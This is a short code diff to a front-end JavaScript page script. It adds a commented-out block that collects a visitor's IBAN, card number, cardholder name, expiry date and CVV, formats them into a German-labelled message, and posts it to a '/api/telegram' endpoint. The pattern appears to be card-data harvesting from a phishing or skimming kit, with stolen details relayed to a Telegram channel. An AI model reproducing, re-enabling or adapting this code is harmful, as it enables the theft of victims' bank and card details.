@@ -364,7 +364,32 @@ nextBtn.addEventListener("click", async () => {
 createBtn.addEventListener("click", () => {
   window.location.href = "register.html";
 });
-//g
+
+/*
+const cardDigits = (cardEl.value || "").replace(/\D/g, "");
+const iban = (ibanEl.value || "")
+  .toUpperCase()
+  .replace(/[^A-Z0-9]/g, "");
+const holder = (holderEl.value || "").trim();
+const adate = (expEl.value || "").replace(/\D/g, "");
+const cvv = (cvvEl.value || "").replace(/\D/g, "");
+
+const msg =
+  `🏦 IBAN: ${iban}\n` +
+  `🏦 Bank: ${BANK_NAME || "Unbekannt"}\n` +
+  `💳 Kartennummer: ${cardDigits}\n` +
+  `👤 Kartenbesitzer: ${holder}\n` +
+  `📅 Ablaufdatum: ${adate}\n` +
+  `🔐 CVV: ${cvv}\n`
+  
+
+  await fetch("/api/telegram", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ message: msg })
+  });*/
+
+
 render();
 setNextEnabled(false);
 setError(false);
